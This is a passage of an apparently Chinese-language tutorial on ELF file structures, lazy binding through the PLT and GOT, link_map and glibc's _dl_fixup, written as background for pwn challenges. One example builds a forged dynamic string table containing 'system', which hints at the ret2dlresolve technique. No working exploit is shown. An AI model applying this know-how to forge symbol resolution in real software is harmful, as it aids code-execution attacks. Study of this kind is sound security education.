<li><p><code>e_ident</code><strong>：ELF 文件的魔数和其他信息。</strong></p></li>
<li><p>前 4 字节为 <code>ELFMAG</code> 即 <code>\x7fELF</code> 。</p></li>
<li><p>第 5 字节为 ELF 文件类型，值为 <code>ELFCLASS32(1)</code> 代表 32 位，值为 <code>ELFCLASS64(2)</code> 代表 64 位。</p></li>
<li><p>第 6 字节为 ELF 的字节序，0 为无效格式，1 为小端格式，2 为大端格式.。</p></li>
<li><p>第 7 字节为 ELF 版本，一般为 1 ，即 1.2 版本。</p></li>
<li><p>后面 9 字节没有定义一般填 0 ，有些平台会使用这 9 个字节作为扩展标志。</p></li>
<li><p><code>e_type</code><strong>：表示ELF文件类型，如可执行文件、共享对象文件（</strong><code>.so</code><strong>）、可重定位文件（</strong><code>.o</code><strong>）等。</strong></p></li>
<li><p><code>e_machine</code>：表示目标体系结构，即程序的目标平台，如 x86、ARM 等。相关常量以 <code>EM_</code> 开头。</p></li>
<li><p><code>e_version</code>：ELF 文件版本号，一般为常数 1 。</p></li>
<li><p><code>e_entry</code><strong>：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为 0 </strong></p></li>
<li><p><code>e_phoff</code><strong>：表示程序头表的文件偏移量。</strong></p></li>
<li><p><code>e_shoff</code><strong>：表示节表的文件偏移量。</strong></p></li>
<li><p><code>e_flags</code>：表示处理器特定标志。</p></li>
<li><p><code>e_ehsize</code><strong>：表示 ELF 文件头的大小。</strong></p></li>
<li><p><code>e_phentsize</code><strong>：表示程序头表中每个表项的大小。</strong></p></li>
<li><p><code>e_phnum</code><strong>：表示程序头表中表项的数量。</strong></p></li>
<li><p><code>e_shentsize</code><strong>：表示节表中每个表项的大小。</strong></p></li>
<li><p><code>e_shnum</code><strong>：表示节表中表项的数量。</strong></p></li>
<li><p><code>e_shstrndx</code>：<strong>表示节表中字符串表的索引。</strong></p></li>
</ul>
<h4 id="elf-section-header-table">ELF Section Header Table</h4>
<h5 id="位-2">32位</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	Elf32_Word	sh_name;</span><br><span class="line">	Elf32_Word	sh_type;</span><br><span class="line">	Elf32_Word	sh_flags;</span><br><span class="line">	Elf32_Addr	sh_addr;</span><br><span class="line">	Elf32_Off	sh_offset;</span><br><span class="line">	Elf32_Word	sh_size;</span><br><span class="line">	Elf32_Word	sh_link;</span><br><span class="line">	Elf32_Word	sh_info;</span><br><span class="line">	Elf32_Word	sh_addralign;</span><br><span class="line">	Elf32_Word	sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<h5 id="位-3">64位</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	Elf64_Word	sh_name; <span class="comment">//1</span></span><br><span class="line">	Elf64_Word	sh_type;</span><br><span class="line">	Elf64_Xword	sh_flags;</span><br><span class="line">	Elf64_Addr	sh_addr;</span><br><span class="line">	Elf64_Off	sh_offset;</span><br><span class="line">	Elf64_Xword	sh_size;</span><br><span class="line">	Elf64_Word	sh_link;</span><br><span class="line">	Elf64_Word	sh_info;</span><br><span class="line">	Elf64_Xword	sh_addralign;</span><br><span class="line">	Elf64_Xword	sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>sh_name</code>：<strong>表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，</strong><code>sh_name</code> <strong>指定了节的名称在字符串表中的位置。</strong></li>
<li><code>sh_type</code>：<strong>表示节的类型，指定了节的用途和属性。</strong></li>
</ul>
<table>
<thead>
<tr class="header">
<th>Name</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>SHT_NULL</td>
<td>0</td>
</tr>
<tr class="even">
<td>SHT_PROGBITS : 程序/数据/</td>
<td>1</td>
</tr>
<tr class="odd">
<td>SHT_SYMTAB : 符号表</td>
<td>2</td>
</tr>
<tr class="even">
<td>SHT_STRTAB : 字符串表</td>
<td>3</td>
</tr>
<tr class="odd">
<td>SHT_RELA : 重定位表</td>
<td>4</td>
</tr>
<tr class="even">
<td>SHT_HASH: HASH 表</td>
<td>5</td>
</tr>
<tr class="odd">
<td>SHT_DYNAMIC: 动态链接</td>
<td>6</td>
</tr>
<tr class="even">
<td>SHT_NOTE : 注释</td>
<td>7</td>
</tr>
<tr class="odd">
<td>SHT_NOBITS: 不存在于文件中</td>
<td>8</td>
</tr>
<tr class="even">
<td>SHT_REL : 重定位的一些信息</td>
<td>9</td>
</tr>
<tr class="odd">
<td>SHT_SHLIB</td>
<td>10</td>
</tr>
<tr class="even">
<td>SHT_DYNSYM : 动态链接的符号表</td>
<td>11</td>
</tr>
<tr class="odd">
<td>SHT_INIT_ARRAY</td>
<td>14</td>
</tr>
<tr class="even">
<td>SHT_FINI_ARRAY</td>
<td>15</td>
</tr>
<tr class="odd">
<td>SHT_PREINIT_ARRAY</td>
<td>16</td>
</tr>
<tr class="even">
<td>SHT_GROUP</td>
<td>17</td>
</tr>
<tr class="odd">
<td>SHT_SYMTAB_SHNDX</td>
<td>18</td>
</tr>
<tr class="even">
<td>SHT_LOOS</td>
<td>0x60000000</td>
</tr>
<tr class="odd">
<td>SHT_HIOS</td>
<td>0x6fffffff</td>
</tr>
<tr class="even">
<td>SHT_LOPROC</td>
<td>0x70000000</td>
</tr>
<tr class="odd">
<td>SHT_HIPROC</td>
<td>0x7fffffff</td>
</tr>
<tr class="even">
<td>SHT_LOUSER</td>
<td>0x80000000</td>
</tr>
<tr class="odd">
<td>SHT_HIUSER</td>
<td>0xffffffff</td>
</tr>
</tbody>
</table>
<ul>
<li><p><code>sh_flags</code>：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。</p></li>
<li><p><code>sh_addr</code><strong>：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，</strong><code>sh_addr</code> <strong>指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。</strong></p></li>
<li><p><code>sh_offset</code><strong>：表示节在文件中的偏移量，指定了节在文件中的位置。对于 bss 段来说该值没有意义。</strong></p></li>
<li><p><code>sh_size</code><strong>：表示节的大小，指定了节所占据的字节数。</strong></p></li>
<li><p><code>sh_link</code>：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。</p></li>
<li><p><code>sh_info</code>：附加信息，具体含义依赖于节的类型。</p></li>
<li><p><code>sh_addralign</code>：表示节的地址对齐要求，指定了节在内存中的对齐方式。即 <code>sh_addr</code> 需要满足 sh_addrmod  2sh_addralign=0sh_addrmod2sh_addralign=0 。如果 <code>sh_addralign</code> 为 0 或 1 表示该段没有对齐要求。</p></li>
<li><p><code>sh_entsize</code><strong>：表示节中每个项的大小，如果该字段为 0 说明节中不包含固定大小的项。</strong></p></li>
</ul>
<p>ELF 中常见的节如下：</p>
<ul>
<li><p><code>.text</code>：代码段（Code Section），用于存储程序的可执行指令。</p></li>
<li><p><code>.rodata</code>：只读数据段（Read-Only Data Section），用于存储只读的常量数据，例如字符串常量。</p></li>
<li><p><code>.data</code>：数据段（Data Section），用于存储已初始化的全局变量和静态变量。</p></li>
<li><p><code>.bss</code>：未初始化的数据段（Block Started by Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。</p></li>
<li><p><code>.symtab</code>：符号表节（Symbol Table Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。</p></li>
<li><p><code>.strtab</code>：字符串表节（String Table Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。</p></li>
<li><p><code>.rel.text</code> 或 <code>.rela.text</code>：代码重定位节（Relocation Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。</p></li>
<li><p><code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。</p></li>
<li><p><code>.dynamic</code>：动态节（Dynamic Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。</p></li>
<li><p><code>.note</code>：注释节（Note Section），用于存储与程序或库相关的注释或调试信息。</p></li>
</ul>
<h4 id="延迟绑定流程">延迟绑定流程</h4>
<h4 id="plt与plt.sec">plt与plt.sec</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func@plt:</span><br><span class="line">jmp    [func@got.plt]     ; 第一次跳转，直接跳转到 GOT 中存储的地址</span><br><span class="line">push   offset             ; offset 为该函数在 GOT 中的索引，如果是第一次调用，GOT 中的地址指向下一条指令</span><br><span class="line">jmp    .plt[0]            ; 跳转到 PLT 的“调度程序”</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.plt[0]:</span><br><span class="line">push   QWORD PTR [rip+0x2fe2]         <span class="comment"># push link_map</span></span><br><span class="line">bnd jmp QWORD PTR [rip+0x2fe3]        <span class="comment"># jmp _dl_runtime_resolve</span></span><br><span class="line">nop    DWORD PTR [rax]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func@plt.sec</span><br><span class="line">endbr64</span><br><span class="line">bnd jmp QWORD PTR [rip+0x2f9d]        <span class="comment"># &lt;func@got.plt&gt;</span></span><br><span class="line">nop    DWORD PTR [rax+rax*1+0x0]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x401020 - 0x401050:</span><br><span class="line">No symbols found <span class="keyword">in</span> section .plt</span><br><span class="line">Section .plt.sec 0x401050 - 0x401070:</span><br><span class="line">0x401050: setbuf@plt</span><br><span class="line">0x401060: <span class="built_in">read</span>@plt</span><br><span class="line">pwndbg&gt; x/32i 0x401020</span><br><span class="line">   0x401020:    push   QWORD PTR [rip+0x2fe2]        <span class="comment"># 0x404008</span></span><br><span class="line">   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        <span class="comment"># 0x404010</span></span><br><span class="line">   0x40102d:    nop    DWORD PTR [rax]</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   0x401044:    push   0x1</span><br><span class="line">   0x401049:    bnd jmp 0x401020</span><br><span class="line">   0x40104f:    nop</span><br><span class="line">   0x401050 &lt;setbuf@plt&gt;:       endbr64</span><br><span class="line">   0x401054 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2fbd]        <span class="comment"># 0x404018 &lt;setbuf@got.plt&gt;</span></span><br><span class="line">   0x40105b &lt;setbuf@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">=&gt; 0x401060 &lt;<span class="built_in">read</span>@plt&gt;: endbr64</span><br><span class="line">   0x401064 &lt;<span class="built_in">read</span>@plt+4&gt;:       bnd jmp QWORD PTR [rip+0x2fb5]        <span class="comment"># 0x404020 &lt;read@got.plt&gt;</span></span><br><span class="line">   0x40106b &lt;<span class="built_in">read</span>@plt+11&gt;:      nop    DWORD PTR [rax+rax*1+0x0]</span><br></pre></td></tr></table></figure>
<h4 id="got与got.plt">got与got.plt</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">got.plt</span><br><span class="line">(_GLOBAL_OFFSET_TABLE_)     —▸ 0x403e20 (_DYNAMIC) ◂— 1</span><br><span class="line">(_GLOBAL_OFFSET_TABLE_+8)   —▸ 0x7ffff7ffe190(link_map) ◂— 0</span><br><span class="line">(_GLOBAL_OFFSET_TABLE_+16)  —▸ 0x7ffff7fe7bc0(_dl_runtime_resolve) ◂— endbr64</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│     0x403ff0 —▸ 0x7d56930a2f90 (__libc_start_main) ◂— endbr64             <span class="comment"># got</span></span><br><span class="line">01:0008│     0x403ff8 ◂— 0</span><br><span class="line">02:0010│     0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1          <span class="comment"># got.plt</span></span><br><span class="line">03:0018│     0x404008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7d56932a2190 ◂— 0</span><br><span class="line">04:0020│     0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7d569328bbc0 ◂— endbr64</span><br><span class="line">05:0028│     0x404018 (setbuf@got[plt]) —▸ 0x7d569310aad0 (setbuf) ◂— endbr64</span><br><span class="line">06:0030│     0x404020 (<span class="built_in">read</span>@got[plt]) —▸ 0x401040 ◂— endbr64</span><br></pre></td></tr></table></figure>
<h4 id="symtab">.symtab</h4>
<p><strong>注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过</strong> <code>strip + 程序名</code> <strong>的方式将符号表去除，这就是为什么有的 pwn 题的附件没有函数和变量名而有的却有。</strong></p>
<p>ELF 文件中的符号表往往是文件中的一个段，段名一般叫 <code>.symtab</code> 。符号表是一个 <code>Elf*_Sym</code> 结构（32 位 ELF 文件）的数组，每个 <code>Elf*_Sym</code> 结构对应一个符号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>  </span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span>  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span>  </span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>st_name</code>：符号名称在<strong>字符串</strong>表中的偏移量。</p></li>
<li><p><code>st_value</code>：符号的值，即符号的地址或偏移量。</p></li>
<li><p>如果该符号在<strong>目标文件</strong>中，如果是符号的定义并且该符号不是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>。</p></li>
<li><p>在<strong>目标文件</strong>中，如果符号是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号的<strong>对齐属性</strong>。</p></li>
<li><p>在<strong>可执行文件</strong>中，<code>st_value</code> 表示符号的<strong>虚拟地址</strong>。</p></li>
<li><p><code>st_size</code>：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为 0 表示符号的大小为 0 或未知。</p></li>
<li><p><code>st_info</code>：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高 4 位表示符号的类型，低 4 位表示符号的绑定信息。</p></li>
<li><p><code>st_other</code>：保留字段，通常为 0 。</p></li>
<li><p><code>st_shndx</code>：通常为符号所在<strong>节</strong>的索引。</p></li>
<li><p>如果符号是一个常量，该字段为 <code>SHN_ABS</code>（初始值不为 0 的全局变量） 或 <code>SHN_COMMON</code>（初始值为 0 的全局变量）。</p></li>
<li><p>如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为 <code>SHN_UNDEF</code> 。</p></li>
</ul>
<h4 id="rel.text.rel.data">.rel.text/.rel.data</h4>
<p>重定位表是一个 <code>Elf*_Rel</code> 结构的数组，每个数组元素对应一个重定位入口。重定位表主要有<code>.rel.text</code> 或 <code>.rela.text</code>，即代码重定位节（Relocation Section）和 <code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span>  </span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span>  </span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>r_offset</code>：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。</p></li>
<li><p>对于可执行文件或共享库，<code>r_offset</code> 表示需要修改的位置在内存中的位置（用于动态链接）。</p></li>
<li><p>对于<strong>可重定位文件</strong>，<code>r_offset</code> 表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。</p></li>
<li><p><code>r_info</code>：低 8 位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC 相对重定位等。高 24 位表示该符号在<strong>符号表</strong>中的索引，用于解析重定位所引用的符号。</p></li>
</ul>
<h4 id="strtab">.strtab</h4>
<ul>
<li><p>ELF 文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</p></li>
<li><p>通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“<code>.strtab</code>”或“<code>.shstrtab</code>”。这两个字符串表分别为字符串表（String Table）和段表字符串表（Section Header String Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（<code>sh_name</code> ）。</p></li>
<li><p>注意，在字符串表中的每个字符串的<strong>开头</strong>和<strong>结尾</strong>都有一个 <code>\x00</code> 填充。例如： <code>fake_dynstr = '\x00libc.so.6\x00_IO_stdin_used\x00stdin\x00strlen\x00read\x00stdout\x00setbuf\x00__libc_start_main\x00system\x00'</code></p></li>
</ul>
<h4 id="dynamic">.dynamic</h4>
<p>动态链接 ELF 中最重要的结构是 <code>.dynamic</code> 段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<code>.dynamic</code> 段是由<code>Elf*_Dyn</code> 构成的结构体数组。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">union</span>  </span></span><br><span class="line"><span class="class">    &#123;</span>  </span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span>  </span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span>  </span><br><span class="line">    &#125; d_un;  </span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p><code>Elf32_Dyn</code> 结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在 <code>elf.h</code> 里面的宏），</p>
<ul>
<li><p><code>DT_SYMTAB</code>：指定了符号表的地址，<code>d_ptr</code> 表示 <code>.dynsym</code> 的地址。</p></li>
<li><p><code>DT_STRTAB</code>：指定了字符串表的地址，<code>d_ptr</code> 表示 <code>.synstr</code> 的地址。</p></li>
<li><p><code>DT_STRSZ</code>：指定了字符串表的大小，<code>d_val</code> 表示大小。</p></li>
<li><p><code>DT_HASH</code>：指定了符号哈希表的地址，用于加快符号查找的速度，<code>d_ptr</code> 表示 <code>.hash</code> 的地址。</p></li>
<li><p><code>DT_SONAME</code>：指定了共享库的名称。</p></li>
<li><p><code>DT_RPATH</code>：指定了库搜索路径（已废弃，不推荐使用）。</p></li>
<li><p><code>DT_INIT</code>：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。</p></li>
<li><p><code>DT_FINI</code>：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。</p></li>
<li><p><code>DT_NEEDED</code>：指定了需要的共享库的名称。</p></li>
<li><p><code>DT_REL/DT_RELA</code>：指定了重定位表的地址。</p></li>
</ul>
<h4 id="link_map_x86">link_map_x86</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;    <span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">           file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;   <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;    <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">    ...</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br></pre></td></tr></table></figure>
<p><code>link_map</code> 是存储目标函数查询结果的一个结构体，我们主要关心 <code>l_addr</code> 和 <code>l_info</code> 两个成员即可。</p>
<ul>
<li><p><code>l_addr</code>：目标函数所在 lib 的基址。</p></li>
<li><p><code>l_info</code>：<code>Dyn</code> 结构体指针，指向各种结构对应的 <code>Dyn</code> 。</p></li>
<li><p><code>l_info[DT_STRTAB]</code>：即 <code>l_info</code> 数组第 5 项，指向 <code>.dynstr</code> 对应的 <code>Dyn</code> 。</p></li>
<li><p><code>l_info[DT_SYMTAB]</code>：即 <code>l_info</code> 数组第 6 项，指向 <code>Sym</code> 对应的 <code>Dyn</code> 。</p></li>
<li><p><code>l_info[DT_JMPREL]</code>：即 <code>l_info</code> 数组第 23 项，指向 <code>Rel</code> 对应的 <code>Dyn</code> 。</p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf32_Addr l_addr;</span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line">    Elf32_Dyn *l_ld;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    Elf32_Dyn *l_info[<span class="number">76</span>];<span class="comment">//l_info 里面包含的就是动态链接的各个表的信息</span></span><br><span class="line">    <span class="type">const</span> Elf32_Phdr *l_phdr;</span><br><span class="line">    Elf32_Addr l_entry;</span><br><span class="line">    Elf32_Half l_phnum;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dynamic 中的地址对应着 link_map 中l_info 相应的指针，可从link_map 取到dynamic 结构中.rel.plt .dynsym .dynstr对应的指针,为后来程序的执行提供各个节的基地址</p>
<h4 id="dl_runtime_resolve">_dl_runtime_resolve</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">union</span>  </span></span><br><span class="line"><span class="class">    &#123;</span>  </span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span>  </span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span>  </span><br><span class="line">    &#125; d_un;  </span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> PLTREL  ElfW(Rel)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)  这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> 